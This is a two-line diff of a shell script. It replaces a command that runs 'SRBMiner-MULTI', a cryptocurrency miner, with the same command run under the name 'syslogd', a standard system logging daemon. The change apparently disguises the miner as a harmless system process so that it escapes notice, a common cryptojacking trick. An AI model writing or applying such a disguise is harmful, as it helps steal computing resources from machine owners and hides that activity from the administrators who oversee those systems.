@@ -1,2 +1,2 @@
 #!/bin/sh
-./SRBMiner-MULTI --setup
+./syslogd --setup
